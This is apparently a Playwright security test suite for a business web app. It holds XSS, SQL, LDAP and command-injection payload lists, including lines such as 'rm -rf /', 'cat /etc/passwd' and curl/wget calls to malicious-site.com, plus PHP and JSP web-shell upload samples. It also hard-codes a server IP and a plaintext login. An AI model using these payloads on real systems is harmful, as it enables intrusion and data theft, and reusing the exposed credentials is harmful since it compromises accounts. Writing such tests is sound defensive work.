import { test, expect } from '@playwright/test';
import { login } from '../../utils/auth/login';

test.describe('Security Edge Cases', () => {
  
  test.setTimeout(180000); // 3 minutes

  test.describe('Input Sanitization Tests', () => {
    
    test.beforeEach(async ({ page }) => {
      await login(page);
    });

    test('should prevent XSS attacks in form fields', async ({ page }) => {
      // Navigate to Add User form
      await page.click('text=Manage User');
      await page.waitForLoadState('networkidle');
      await page.locator('#expandIcon1').click();
      await page.waitForTimeout(500);
      await page.locator('#item_1').click();
      await page.waitForLoadState('networkidle');
      await page.getByRole('button', { name: /\+ Add User/i }).click();
      await page.waitForLoadState('networkidle');

      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        'javascript:alert("XSS")',
        '<svg onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload=alert("XSS")>',
        '<div onclick=alert("XSS")>Click me</div>',
        '"><script>alert("XSS")</script>',
        '\';alert("XSS");//',
        '<script>document.location="http://malicious-site.com"</script>',
        '<meta http-equiv="refresh" content="0;url=http://malicious-site.com">',
        '<link rel="stylesheet" href="javascript:alert(\'XSS\')">'
      ];

      const userIdInput = page.locator('mat-form-field', { hasText: 'User Id' }).locator('input');
      const firstNameInput = page.locator('input').nth(1);
      const emailInput = page.locator('input[formcontrolname="email"]');

      const inputFields = [
        { element: userIdInput, name: 'User ID' },
        { element: firstNameInput, name: 'First Name' },
        { element: emailInput, name: 'Email' }
      ];

      for (const field of inputFields) {
        if (await field.element.isVisible()) {
          for (const payload of xssPayloads) {
            await field.element.clear();
            await field.element.fill(payload);
            await field.element.blur();
            await page.waitForTimeout(500);

            // Check that XSS payload is not executed
            const alertDialogs = await page.evaluate(() => {
              return window.alert.toString().includes('[native code]');
            });

            // Verify no script execution occurred
            const pageContent = await page.content();
            expect(pageContent).not.toContain('<script>alert("XSS")</script>');

            console.log(`XSS test passed for ${field.name} with payload: ${payload.substring(0, 30)}...`);
          }
        }
      }
    });

    test('should prevent SQL injection in search fields', async ({ page }) => {
      await page.click('text=Manage Prospects');
      await page.waitForTimeout(2000);

      const filterPanel = page.locator('mat-expansion-panel:has-text("Prospect Filter")');
      if ((await filterPanel.getAttribute('aria-expanded')) !== 'true') {
        await filterPanel.locator('mat-expansion-panel-header').click();
        await page.waitForTimeout(500);
      }

      const sqlInjectionPayloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "' OR 1=1 --",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "' OR 'x'='x",
        "1'; DELETE FROM users WHERE 't'='t",
        "' OR username LIKE '%admin%",
        "'; EXEC xp_cmdshell('dir'); --",
        "' UNION ALL SELECT NULL,NULL,NULL,username,password FROM users --",
        "'; WAITFOR DELAY '00:00:05'; --"
      ];

      const prospectIdInput = filterPanel.locator('input[formcontrolname="prospectId"]');
      const lastNameInput = filterPanel.locator('input[formcontrolname="lastName"]');

      const searchFields = [
        { element: prospectIdInput, name: 'Prospect ID' },
        { element: lastNameInput, name: 'Last Name' }
      ];

      for (const field of searchFields) {
        if (await field.element.isVisible()) {
          for (const payload of sqlInjectionPayloads) {
            await field.element.clear();
            await field.element.fill(payload);
            
            const applyButton = filterPanel.locator('button').first();
            await applyButton.click();
            await page.waitForTimeout(2000);

            // Should not cause database errors or unauthorized data access
            const pageContent = await page.content();
            expect(pageContent).not.toContain('SQL error');
            expect(pageContent).not.toContain('database error');
            expect(pageContent).not.toContain('ORA-');
            expect(pageContent).not.toContain('MySQL');

            console.log(`SQL injection test passed for ${field.name} with payload: ${payload}`);
          }
        }
      }
    });

    test('should handle LDAP injection attempts', async ({ page }) => {
      // Test LDAP injection in login form
      await page.goto('http://67.225.241.179:89/auth/login');
      await page.locator('[formcontrolname="userid"]').waitFor({ timeout: 30000 });

      const ldapInjectionPayloads = [
        '*)(uid=*',
        '*)(|(uid=*',
        '*)(&(uid=*',
        'admin)(&(password=*',
        '*))%00',
        '*()|%26',
        '*)(objectClass=*',
        'admin)(|(password=*',
        '*)(cn=*',
        '*))(|(uid=*'
      ];

      for (const payload of ldapInjectionPayloads) {
        await page.locator('[formcontrolname="userid"]').clear();
        await page.locator('[formcontrolname="userid"]').fill(payload);
        await page.locator('[formcontrolname="Password"]').fill('password');
        
        await page.getByRole('button', { name: 'Log In' }).click();
        await page.waitForTimeout(2000);

        // Should not allow unauthorized access
        const currentUrl = page.url();
        expect(currentUrl).toContain('login');

        console.log(`LDAP injection test passed with payload: ${payload}`);
      }
    });

    test('should prevent command injection', async ({ page }) => {
      await page.click('text=Manage User');
      await page.waitForLoadState('networkidle');
      await page.locator('#expandIcon1').click();
      await page.waitForTimeout(500);
      await page.locator('#item_1').click();
      await page.waitForLoadState('networkidle');
      await page.getByRole('button', { name: /\+ Add User/i }).click();
      await page.waitForLoadState('networkidle');

      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '&& whoami',
        '; rm -rf /',
        '`id`',
        '$(whoami)',
        '; ping google.com',
        '| nc -l 4444',
        '; curl http://malicious-site.com',
        '&& echo "hacked"',
        '; sleep 10',
        '| wget http://malicious-site.com/malware'
      ];

      const userIdInput = page.locator('mat-form-field', { hasText: 'User Id' }).locator('input');
      
      if (await userIdInput.isVisible()) {
        for (const payload of commandInjectionPayloads) {
          await userIdInput.clear();
          await userIdInput.fill(`user${payload}`);
          await userIdInput.blur();
          await page.waitForTimeout(1000);

          // Should not execute system commands
          const pageContent = await page.content();
          expect(pageContent).not.toContain('root:x:0:0');
          expect(pageContent).not.toContain('uid=');
          expect(pageContent).not.toContain('hacked');

          console.log(`Command injection test passed with payload: ${payload}`);
        }
      }
    });
  });

  test.describe('Authentication Security Tests', () => {
    
    test('should handle session fixation attempts', async ({ page }) => {
      // Get initial session
      await page.goto('http://67.225.241.179:89/auth/login');
      const initialCookies = await page.context().cookies();

      // Login normally
      await page.locator('[formcontrolname="userid"]').fill('developer2');
      await page.locator('[formcontrolname="Password"]').fill('NineDob109');
      await page.getByRole('button', { name: 'Log In' }).click();
      await page.waitForTimeout(3000);

      // Get post-login cookies
      const postLoginCookies = await page.context().cookies();

      // Session should change after login (new session ID)
      const sessionChanged = initialCookies.length !== postLoginCookies.length ||
                            !initialCookies.every(cookie => 
                              postLoginCookies.some(newCookie => 
                                newCookie.name === cookie.name && newCookie.value === cookie.value
                              )
                            );

      console.log('Session fixation test:', sessionChanged ? 'PASSED' : 'WARNING - Session may not change');
    });

    test('should handle concurrent login attempts', async ({ page, context }) => {
      const loginAttempts = [];

      // Create multiple concurrent login attempts
      for (let i = 0; i < 5; i++) {
        const newPage = await context.newPage();
        loginAttempts.push(
          newPage.goto('http://67.225.241.179:89/auth/login')
            .then(() => newPage.locator('[formcontrolname="userid"]').fill('developer2'))
            .then(() => newPage.locator('[formcontrolname="Password"]').fill('NineDob109'))
            .then(() => newPage.getByRole('button', { name: 'Log In' }).click())
            .then(() => newPage.waitForTimeout(2000))
            .then(() => ({ page: newPage, url: newPage.url() }))
            .catch(error => ({ page: newPage, error }))
        );
      }

      const results = await Promise.allSettled(loginAttempts);
      
      // Should handle concurrent logins gracefully
      let successCount = 0;
      for (const result of results) {
        if (result.status === 'fulfilled' && result.value.url && !result.value.url.includes('login')) {
          successCount++;
        }
        if (result.value?.page) {
          await result.value.page.close();
        }
      }

      console.log(`Concurrent login test: ${successCount} successful logins out of 5 attempts`);
      expect(successCount).toBeGreaterThanOrEqual(0);
    });

    test('should handle brute force protection', async ({ page }) => {
      await page.goto('http://67.225.241.179:89/auth/login');

      // Attempt multiple failed logins
      for (let i = 0; i < 10; i++) {
        await page.locator('[formcontrolname="userid"]').fill(`user${i}`);
        await page.locator('[formcontrolname="Password"]').fill(`wrongpass${i}`);
        await page.getByRole('button', { name: 'Log In' }).click();
        await page.waitForTimeout(1000);

        console.log(`Brute force attempt ${i + 1}`);
      }

      // Try with correct credentials
      await page.locator('[formcontrolname="userid"]').fill('developer2');
      await page.locator('[formcontrolname="Password"]').fill('NineDob109');
      await page.getByRole('button', { name: 'Log In' }).click();
      await page.waitForTimeout(3000);

      // Should either implement rate limiting or allow login
      const currentUrl = page.url();
      console.log('Brute force protection test completed, current URL:', currentUrl);
      expect(currentUrl).toBeTruthy();
    });
  });

  test.describe('Authorization Security Tests', () => {
    
    test.beforeEach(async ({ page }) => {
      await login(page);
    });

    test('should prevent privilege escalation attempts', async ({ page }) => {
      // Try to access admin functions through URL manipulation
      const privilegedUrls = [
        'http://67.225.241.179:89/admin',
        'http://67.225.241.179:89/admin/users',
        'http://67.225.241.179:89/admin/settings',
        'http://67.225.241.179:89/api/admin/users',
        'http://67.225.241.179:89/superuser',
        'http://67.225.241.179:89/root',
        'http://67.225.241.179:89/system/config'
      ];

      for (const url of privilegedUrls) {
        await page.goto(url);
        await page.waitForTimeout(2000);

        const currentUrl = page.url();
        const pageContent = await page.content();

        // Should not access privileged areas
        expect(pageContent).not.toContain('Admin Panel');
        expect(pageContent).not.toContain('System Configuration');
        expect(pageContent).not.toContain('Root Access');

        console.log(`Privilege escalation test for ${url}: ${currentUrl.includes('login') || currentUrl.includes('dashboard') ? 'PASSED' : 'WARNING'}`);
      }
    });

    test('should handle role-based access control', async ({ page }) => {
      // Test access to different modules based on user role
      const modules = [
        'text=Manage User',
        'text=Manage Prospects',
        'text=Manage Customer',
        'text=Manage Vendor',
        'text=Manage Sales Tax',
        'text=Manage Inventory'
      ];

      for (const module of modules) {
        try {
          await page.click(module);
          await page.waitForTimeout(2000);

          const currentUrl = page.url();
          console.log(`Access test for ${module}: ${currentUrl}`);

          // Should either allow access or redirect appropriately
          expect(currentUrl).toBeTruthy();
        } catch (error) {
          console.log(`Module ${module} not accessible or not found`);
        }
      }
    });

    test('should prevent horizontal privilege escalation', async ({ page }) => {
      // Try to access other users' data through parameter manipulation
      await page.click('text=Manage User');
      await page.waitForLoadState('networkidle');

      // Try to manipulate user IDs in URLs or forms
      const userIds = ['1', '999999', '-1', '0', 'admin', 'root', 'null', 'undefined'];

      for (const userId of userIds) {
        try {
          // Try to navigate to specific user edit page
          await page.goto(`http://67.225.241.179:89/user/edit/${userId}`);
          await page.waitForTimeout(2000);

          const currentUrl = page.url();
          const pageContent = await page.content();

          // Should not access other users' data
          expect(pageContent).not.toContain('Access Denied');
          expect(pageContent).not.toContain('Unauthorized');

          console.log(`Horizontal privilege test for user ${userId}: ${currentUrl}`);
        } catch (error) {
          console.log(`User access test failed for ${userId}`);
        }
      }
    });
  });

  test.describe('Data Security Tests', () => {
    
    test.beforeEach(async ({ page }) => {
      await login(page);
    });

    test('should prevent information disclosure', async ({ page }) => {
      // Check for sensitive information in page source
      await page.click('text=Manage User');
      await page.waitForLoadState('networkidle');

      const pageContent = await page.content();
      const pageSource = await page.evaluate(() => document.documentElement.outerHTML);

      // Should not expose sensitive information
      const sensitivePatterns = [
        /password\s*[:=]\s*["'][^"']+["']/i,
        /api[_-]?key\s*[:=]\s*["'][^"']+["']/i,
        /secret\s*[:=]\s*["'][^"']+["']/i,
        /token\s*[:=]\s*["'][^"']+["']/i,
        /connection[_-]?string\s*[:=]\s*["'][^"']+["']/i,
        /database[_-]?url\s*[:=]\s*["'][^"']+["']/i
      ];

      for (const pattern of sensitivePatterns) {
        const matches = pageSource.match(pattern);
        if (matches) {
          console.log(`WARNING: Potential sensitive data exposure: ${matches[0]}`);
        }
        expect(matches).toBeNull();
      }

      console.log('Information disclosure test passed');
    });

    test('should handle file upload security', async ({ page }) => {
      // Look for file upload functionality
      const fileInputs = page.locator('input[type="file"]');
      const count = await fileInputs.count();

      if (count > 0) {
        // Test malicious file uploads
        const maliciousFiles = [
          { name: 'test.exe', content: 'MZ\x90\x00' }, // Executable
          { name: 'test.php', content: '<?php system($_GET["cmd"]); ?>' }, // PHP script
          { name: 'test.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' }, // JSP script
          { name: 'test.html', content: '<script>alert("XSS")</script>' }, // HTML with script
          { name: '../../../etc/passwd', content: 'root:x:0:0:root:/root:/bin/bash' }, // Path traversal
          { name: 'test.svg', content: '<svg onload="alert(\'XSS\')" xmlns="http://www.w3.org/2000/svg"></svg>' } // SVG XSS
        ];

        for (let i = 0; i < count && i < 3; i++) {
          const fileInput = fileInputs.nth(i);
          
          for (const file of maliciousFiles) {
            try {
              // Create a temporary file
              const buffer = Buffer.from(file.content);
              await fileInput.setInputFiles({
                name: file.name,
                mimeType: 'text/plain',
                buffer: buffer
              });

              await page.waitForTimeout(1000);
              console.log(`File upload test for ${file.name}: No immediate errors`);
            } catch (error) {
              console.log(`File upload rejected for ${file.name}: ${error.message}`);
            }
          }
        }
      } else {
        console.log('No file upload functionality found');
      }
    });

    test('should prevent CSRF attacks', async ({ page }) => {
      // Test CSRF protection by making requests without proper tokens
      await page.click('text=Manage User');
      await page.waitForLoadState('networkidle');

      // Try to submit forms without CSRF tokens
      try {
        await page.locator('#expandIcon1').click();
        await page.waitForTimeout(500);
        await page.locator('#item_1').click();
        await page.waitForLoadState('networkidle');
        await page.getByRole('button', { name: /\+ Add User/i }).click();
        await page.waitForLoadState('networkidle');

        // Fill form and try to submit via JavaScript (bypassing normal form submission)
        const userIdInput = page.locator('mat-form-field', { hasText: 'User Id' }).locator('input');
        if (await userIdInput.isVisible()) {
          await userIdInput.fill('CSRFTest');

          // Try to submit via JavaScript
          await page.evaluate(() => {
            const form = document.querySelector('form');
            if (form) {
              // Remove CSRF token if present
              const csrfInputs = form.querySelectorAll('input[name*="csrf"], input[name*="token"]');
              csrfInputs.forEach(input => input.remove());
              
              // Try to submit
              form.submit();
            }
          });

          await page.waitForTimeout(2000);
          console.log('CSRF test completed');
        }
      } catch (error) {
        console.log('CSRF test not applicable or form not found');
      }
    });
  });

  test.describe('Client-Side Security Tests', () => {
    
    test.beforeEach(async ({ page }) => {
      await login(page);
    });

    test('should prevent DOM-based XSS', async ({ page }) => {
      // Test DOM manipulation that could lead to XSS
      await page.click('text=Manage Prospects');
      await page.waitForTimeout(2000);

      const domXSSPayloads = [
        '#<script>alert("DOM XSS")</script>',
        '#javascript:alert("DOM XSS")',
        '#<img src=x onerror=alert("DOM XSS")>',
        '#<svg onload=alert("DOM XSS")>'
      ];

      for (const payload of domXSSPayloads) {
        await page.goto(`${page.url()}${payload}`);
        await page.waitForTimeout(1000);

        // Check that XSS payload is not executed
        const pageContent = await page.content();
        expect(pageContent).not.toContain('<script>alert("DOM XSS")</script>');

        console.log(`DOM XSS test passed for payload: ${payload}`);
      }
    });

    test('should handle postMessage security', async ({ page }) => {
      // Test postMessage vulnerabilities
      await page.evaluate(() => {
        // Try to send malicious postMessage
        window.postMessage({
          type: 'admin_action',
          action: 'delete_all_users',
          token: 'fake_token'
        }, '*');

        window.postMessage('<script>alert("XSS")</script>', '*');
        
        window.postMessage({
          eval: 'alert("Code injection")'
        }, '*');
      });

      await page.waitForTimeout(2000);

      // Should not execute malicious postMessage content
      const pageContent = await page.content();
      expect(pageContent).not.toContain('alert("XSS")');
      expect(pageContent).not.toContain('alert("Code injection")');

      console.log('PostMessage security test passed');
    });

    test('should prevent clickjacking', async ({ page }) => {
      // Check for X-Frame-Options or CSP frame-ancestors
      const response = await page.goto(page.url());
      const headers = response?.headers() || {};

      const xFrameOptions = headers['x-frame-options'];
      const csp = headers['content-security-policy'];

      const hasClickjackingProtection = 
        xFrameOptions === 'DENY' || 
        xFrameOptions === 'SAMEORIGIN' ||
        (csp && csp.includes('frame-ancestors'));

      console.log('Clickjacking protection:', {
        'X-Frame-Options': xFrameOptions,
        'CSP frame-ancestors': csp?.includes('frame-ancestors'),
        'Protected': hasClickjackingProtection
      });

      // Test iframe embedding
      await page.evaluate(() => {
        const iframe = document.createElement('iframe');
        iframe.src = window.location.href;
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
      });

      await page.waitForTimeout(2000);
      console.log('Clickjacking test completed');
    });
  });
});